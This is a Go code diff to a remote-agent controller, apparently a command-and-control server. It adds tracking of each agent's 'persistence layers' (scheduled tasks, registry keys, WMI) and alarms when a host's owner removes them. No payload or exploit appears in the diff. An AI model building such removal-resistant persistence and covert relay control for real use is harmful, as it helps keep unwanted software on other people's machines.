@@ -92,7 +92,9 @@ type AgentConn struct {
 	// untrusted marks agents that connected without a registration token
 	// (accepted only while auth enforcement is off).
 	untrusted bool
-	mu        sync.Mutex
+	// prot is the watcher's persistence-layer score ("5/6", "" = unknown).
+	prot string
+	mu   sync.Mutex
 
 	lastSeenMu sync.Mutex
 	lastSeen   time.Time
@@ -1173,7 +1175,7 @@ func (s *Server) pushAgentUpdateAll(bin string) (pushed, skipped, offline, heldb
 // noteHello records version + rollback report from any hello transport,
 // fires the rollback alarm on first sight, and kicks auto-update when
 // enabled. Safe to call redundantly on re-announces.
-func (s *Server) noteHello(id, hostname, ver, bad, to string) {
+func (s *Server) noteHello(id, hostname, ver, bad, to, prot string) {
 	s.agentsMu.Lock()
 	ac, ok := s.agents[id]
 	if ok {
@@ -1181,10 +1183,17 @@ func (s *Server) noteHello(id, hostname, ver, bad, to string) {
 			ac.version = ver
 		}
 		prevBad := ac.rollbackBad
+		prevProt := ac.prot
 		ac.rollbackBad, ac.rollbackTo = bad, to
+		if prot != "" {
+			ac.prot = prot
+		}
 		s.agentsMu.Unlock()
 		if bad != "" && prevBad != bad {
 			s.handleRollback(id, hostname, bad, to)
+		}
+		if prot != "" && prevProt != "" && protScore(prot) < protScore(prevProt) {
+			s.handleProtDrop(id, hostname, prevProt, prot)
 		}
 	} else {
 		s.agentsMu.Unlock()
@@ -1276,6 +1285,26 @@ func (s *Server) heldBad(hostname, memBad string) string {
 		return cur.Bad
 	}
 	return ""
+}
+
+// protScore parses a "5/6" layer score into its intact count (-1 unknown).
+func protScore(p string) int {
+	var a, b int
+	if _, err := fmt.Sscanf(p, "%d/%d", &a, &b); err != nil {
+		return -1
+	}
+	return a
+}
+
+// handleProtDrop alarms when an agent's persistence layers drop (someone is
+// peeling tasks/keys/WMI): early warning before a total kill.
+func (s *Server) handleProtDrop(id, hostname, prev, cur string) {
+	log.Printf("[protect] DEGRADED: %s (%s) persistence %s -> %s — tampering likely, check the box", hostname, id, prev, cur)
+	fmt.Printf("\n[PROTECT] %s (%s): layers %s -> %s — tampering likely\n> ", hostname, id, prev, cur)
+	s.broadcastWS(map[string]interface{}{
+		"type": "protection", "id": id, "hostname": hostname, "prev": prev, "cur": cur,
+	})
+	s.broadcastAgents()
 }
 
 // handleRollback alarms loudly (log + UI event + refreshed list) when an
@@ -1454,6 +1483,7 @@ func (s *Server) Agents() []map[string]interface{} {
 			online = false
 		}
 		outdated := a.version != "" && a.version != version.Version
+		prot := a.prot
 		rb, rt := a.rollbackBad, a.rollbackTo
 		if rb == "" {
 			s.holdMu.Lock()
@@ -1466,7 +1496,7 @@ func (s *Server) Agents() []map[string]interface{} {
 			"id": a.id, "hostname": a.hostname, "user": a.user,
 			"version": a.version, "outdated": outdated,
 			"rollbackBad": rb, "rollbackTo": rt,
-			"untrusted": a.untrusted,
+			"untrusted": a.untrusted, "prot": prot,
 			"connected": online, "seenAgoSec": seenAgo,
 			"latency": lat, "remote": a.remote(), "e2e": s.e2eHas(a.hostname),
 		})
@@ -1791,7 +1821,7 @@ func (s *Server) handleAgent(conn net.Conn, id string) {
 	if first.Version != "" && first.Version != version.Version {
 		log.Printf("[update] %s is outdated (%s vs %s) — push update available", first.Hostname, first.Version, version.Version)
 	}
-	s.noteHello(id, first.Hostname, first.Version, first.RollbackBad, first.RollbackTo)
+	s.noteHello(id, first.Hostname, first.Version, first.RollbackBad, first.RollbackTo, first.Prot)
 	fmt.Printf("\n[+] Agent connected: id=%s hostname=%s user=%s version=%s remote=%s\n", id, first.Hostname, first.User, first.Version, conn.RemoteAddr())
 	_ = ac.send(protocol.Message{Type: protocol.TypeConnected, ID: id, RollbackAck: first.RollbackBad != ""})
 	s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("Agent %s (%s) connected", first.Hostname, id), "success": true})
@@ -2013,7 +2043,7 @@ func (s *Server) ntfyLoop() {
 			fmt.Printf("\n[+] Ntfy agent connected: %s (%s) v%s\n", hostname, id, msg.Version)
 			_ = relay.PublishTo("controller", name, protocol.Message{Type: protocol.TypeConnected, ID: id, E2E: true, RollbackAck: msg.RollbackBad != ""})
 			s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("Ntfy agent %s connected", hostname), "success": true})
-			s.noteHello(id, hostname, msg.Version, msg.RollbackBad, msg.RollbackTo)
+			s.noteHello(id, hostname, msg.Version, msg.RollbackBad, msg.RollbackTo, msg.Prot)
 			continue
 		}
 		if !exists {
@@ -2026,7 +2056,7 @@ func (s *Server) ntfyLoop() {
 				ac.version = msg.Version
 			}
 			ac.untrusted = untrusted
-			s.noteHello(id, hostname, msg.Version, msg.RollbackBad, msg.RollbackTo)
+			s.noteHello(id, hostname, msg.Version, msg.RollbackBad, msg.RollbackTo, msg.Prot)
 			_ = relay.PublishTo("controller", name, protocol.Message{Type: protocol.TypeConnected, ID: id, E2E: true, RollbackAck: msg.RollbackBad != ""})
 			case protocol.TypeOutput:
 					s.ackCmd(msg.CmdID)
@@ -2406,7 +2436,7 @@ func (s *Server) handleMQTTMsg(topic string, env relay.Envelope) {
 			}
 			ac.untrusted = untrusted
 		}
-		s.noteHello(id, host, msg.Version, msg.RollbackBad, msg.RollbackTo)
+		s.noteHello(id, host, msg.Version, msg.RollbackBad, msg.RollbackTo, msg.Prot)
 		s.broadcastAgents()
 		return
 	}
